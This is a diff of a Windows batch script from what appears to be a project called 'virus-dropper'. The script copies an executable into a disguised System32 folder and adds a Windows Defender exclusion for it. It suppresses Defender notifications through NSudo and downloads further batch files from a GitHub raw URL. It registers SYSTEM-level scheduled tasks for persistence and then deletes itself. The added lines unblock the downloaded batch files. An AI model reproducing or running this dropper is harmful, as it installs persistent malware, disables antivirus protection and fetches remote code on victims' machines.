@@ -26,6 +26,8 @@ move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
+powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Update.bat'"
+powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\AV.bat'"
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" "%appdata%\update.bat"
@@ -35,7 +37,6 @@ SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.ex
 SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
 del NSudo.exe
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Version.txt" --output "version.txt"
 move "version.txt" "%systemroot%\System32\Windowsexe"
 call :deleteSelf&exit
 :deleteSelf
